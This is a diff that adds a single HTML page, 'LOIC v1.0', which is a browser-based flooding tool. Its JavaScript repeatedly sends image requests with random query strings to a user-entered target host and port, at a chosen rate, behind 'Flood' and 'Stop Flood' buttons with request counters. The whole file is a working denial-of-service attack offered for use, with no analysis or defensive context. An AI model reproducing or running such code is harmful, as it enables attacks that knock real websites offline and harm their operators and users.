@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+
+  <html>
+
+    <head>
+
+      <script>
+
+        function LOIC(target, port, requestsPerSecond)
+        {
+
+          var requested = 0;
+
+          var succeeded = 0;
+
+          var failed = 0;
+
+          var isFiring = false;
+
+          if(target.length == 0)
+          {
+
+            document.getElementById("errors").innerHTML = "You must enter a target.";
+
+          }
+          else if(requestsPerSecond.length == 0)
+          {
+
+            document.getElementById("errors").innerHTML = "You must tell us how many requests per second we should send.";
+
+          }
+          else if(requestsPerSecond == "0" || requestsPerSecond == 0)
+          {
+
+            document.getElementById("errors").innerHTML = "You want us to send 0 requests per second...????";
+
+          }
+          else
+          {
+
+            if(port.length == 0 || port == 0 || port == "0")
+            {
+
+              port = 80;
+
+            }
+
+            var onFail = function()
+            {
+
+              failed++;
+
+              document.getElementById("failed").innerHTML = failed;
+
+            };
+
+            var onSuccess = function()
+            {
+
+              succeeded++;
+
+              document.getElementById("succeeded").innerHTML = succeeded;
+
+            };
+
+            var onRequest = function()
+            {
+
+              requested++;
+
+              document.getElementById("requests").innerHTML = requested;
+
+            };
+
+            var DoS = function()
+            {
+
+              var image = new Image();
+
+              // image.onerror = function() { onFail(); };
+
+              // image.onabort = function() { onFail(); };
+
+              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+
+              onSuccess();
+
+              onRequest();
+
+            };
+
+            document.getElementById("button").onclick = function()
+            {
+
+              if(isFiring)
+              {
+
+                document.getElementById("errors").innerHTML = "";
+
+                document.getElementById("target").value = "";
+
+                document.getElementById("port").value = "";
+
+                document.getElementById("requestsPerSecond").value = "";
+
+                clearInterval(fireInterval);
+
+                isFiring = false;
+
+                document.getElementById("button").innerHTML = "Flood";
+
+                document.getElementById("status").innerHTML = "Not Running";
+
+              }
+              else
+              {
+
+                document.getElementById("errors").innerHTML = "";
+
+                document.getElementById("target").value = "";
+
+                document.getElementById("port").value = "";
+
+                document.getElementById("requestsPerSecond").value = "";
+
+                isFiring = true;
+
+                document.getElementById("button").innerHTML = "Stop Flood";
+
+                document.getElementById("status").innerHTML = "Running";
+
+                fireInterval = setInterval(DoS, (1000 / parseInt(requestsPerSecond) |0));
+
+              }
+
+            }
+
+          }
+
+        }
+
+      </script>
+
+      <style>
+
+        body
+        {
+
+          background-color: black;
+
+          color: lime;
+
+          font-family: Impact, fantasy;
+
+        }
+
+        input, button
+        {
+
+          width: 300px;
+
+          background-color: lime;
+
+        }
+
+      </style>
+
+      <title>
+
+        LOIC
+
+      </title>
+
+    </head>
+
+    <body>
+
+      <center>
+
+        <h1>
+
+          LOIC v1.0
+
+        </h1>
+
+      </center>
+
+      <center>
+
+        <input type="url" name="target" id="target" placeholder="TARGET" />
+
+        <br />
+
+        <input type="number" name="port" id="port" placeholder="PORT ( MAKE SURE IT'S AN OPEN PORT )" />
+
+        <br />
+
+        <input type="number" name="requestsPerSecond" id="requestsPerSecond" placeholder="REQUESTS PER SECOND" />
+
+        <br />
+
+        <button name="button" id="button" onclick="javascript:LOIC(document.getElementById('target').value, document.getElementById('port').value, document.getElementById('requestsPerSecond').value);">Flood</button>
+
+        <br />
+
+        <div name="errors" id="errors">
+
+        </div>
+
+        <br />
+
+        Requests:
+
+        <br />
+
+        <div name="requests" id="requests">
+
+          0
+
+        </div>
+
+        <br />
+
+        Succeeded:
+
+        <br />
+
+        <div name="succeeded" id="succeeded">
+
+          0
+
+        </div>
+
+        <br />
+
+        Failed:
+
+        <br />
+
+        <div name="failed" id="failed">
+
+          0
+
+        </div>
+
+        <br />
+
+        Status:
+
+        <br />
+
+        <div name="status" id="status">
+
+          Not Running
+
+        </div>
+
+      </center>
+
+    </body>
+
+  </html>
